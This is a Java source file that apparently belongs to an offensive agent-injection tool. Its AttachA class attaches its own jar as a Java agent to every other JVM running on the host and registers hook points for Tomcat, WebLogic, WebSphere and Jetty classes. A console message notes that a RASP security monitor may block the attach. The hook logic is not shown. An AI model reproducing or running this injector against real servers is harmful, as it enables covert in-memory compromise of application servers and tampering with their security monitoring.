package indi.augusttheodor;

import com.sun.tools.attach.*;
import indi.augusttheodor.stage.JettyStage;
import indi.augusttheodor.stage.Stage;
import indi.augusttheodor.stage.TomcatStage;
import indi.augusttheodor.stage.WebLogicStage;
import indi.augusttheodor.stage.WebSphereStage;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class AttachA {

    private static final List<Stage> STAGES = new ArrayList<>();
    static {
        STAGES.add(new TomcatStage());
        STAGES.add(new WebLogicStage());
        STAGES.add(new WebSphereStage());
        STAGES.add(new JettyStage());
    }

    public static List<Stage> getStages() {
        return STAGES;
    }

    public static void doAttach(String args) throws IOException, AgentLoadException, AgentInitializationException {
        String jarPath = AttachA.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        jarPath = new File(jarPath).getPath();
        List<VirtualMachineDescriptor> vList = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : vList) {
            String vmdName = vmd.displayName();
            if (vmdName.contains(new File(jarPath).getName())) {
                continue;
            }
            System.out.println("-------->附加到" + vmdName);
            try {
                VirtualMachine attachV = VirtualMachine.attach(vmd);
                attachV.loadAgent(jarPath, args);
            } catch (Exception ea) {
                System.out.println(
                        vmdName + "----------------不支持Attach！请注意，这一般提示当前进程已经被另一个Agent接管——有可能是RASP（一种动态安全检测工具）。");
            }

        }
    }

    public static HashMap<String, String[]> findAttachClasses() {
        HashMap<String, String[]> re = new HashMap<>();
        for (Stage stage : STAGES) {
            re.putAll(stage.getHookPoints());
        }
        return re;
    }

    public static Stage getStageForClass(String className) {
        for (Stage stage : STAGES) {
            if (stage.getHookPoints().containsKey(className)) {
                return stage;
            }
        }
        return null;
    }

    public static byte[] getRedefineClassBytes() {
        return new byte[0];
    }
}